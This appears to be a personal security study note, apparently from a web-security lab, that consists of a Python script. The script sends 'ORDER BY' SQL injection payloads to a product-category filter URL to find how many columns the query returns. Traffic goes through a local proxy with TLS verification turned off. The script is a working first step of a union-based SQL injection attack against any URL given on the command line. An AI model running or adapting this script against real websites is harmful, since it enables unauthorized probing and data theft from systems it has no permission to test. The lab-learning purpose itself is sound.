📅 **Date**: 18 February 25  
📂 **Category**: Web Security
🔒 **Topic**: SQL Injection
🏷️ Tags: #websecurity/sql-injection

---
```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def exploit_sqli_columb_number(url):
    path = "filters?category=Pets"
    for i in range(1, 50):
        sqli_payload = "'order+by+%s--" % i
        r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])

        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columbs...")
    num_col = exploit_sqli_columb_number(url)
    if num_col:
        print("[+] The Number of columb is " + str(num_col) + ".")
    else:
        print("[-] The sql attack was not successfull")
```
